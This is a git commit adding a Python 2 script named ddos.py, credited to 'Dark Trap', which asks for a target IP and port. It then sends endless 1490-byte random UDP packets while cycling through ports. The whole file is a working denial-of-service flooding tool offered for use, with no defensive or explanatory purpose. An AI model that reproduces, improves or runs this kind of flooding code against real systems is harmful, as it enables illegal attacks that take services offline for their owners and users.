e154bf264270fe12dd341b3fe145f35e07282df7
darktrap000 <48397703+darktrap000@users.noreply.github.com>
2019-03-18 12:36:24 -0300

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,71 @@
+import sys
+
+import os
+
+import time
+
+import socket
+
+import random
+
+#Code Time
+
+from datetime import datetime
+
+now = datetime.now()
+
+hour = now.hour
+
+minute = now.minute
+
+day = now.day
+
+month = now.month
+
+year = now.year
+
+
+##############
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(1490)
+
+#############
+
+
+os.system("clear")
+
+os.system("figlet Yuuko DDos")
+
+print
+
+print "Autor : Dark Trap"
+
+print
+
+ip = raw_input("IP Alvo : ")
+
+port = input("Porta : ")
+
+
+os.system("clear")
+
+os.system("figlet Yuuko DDos")
+
+
+sent = 0
+
+while True:
+
+     sock.sendto(bytes, (ip,port))
+
+     sent = sent + 1
+
+     port = port + 1
+
+     print "Enviado: %s Pacotes Para: %s Na Porta::%s"%(sent,ip,port)
+
+     if port == 65534:
+
+       port = 1
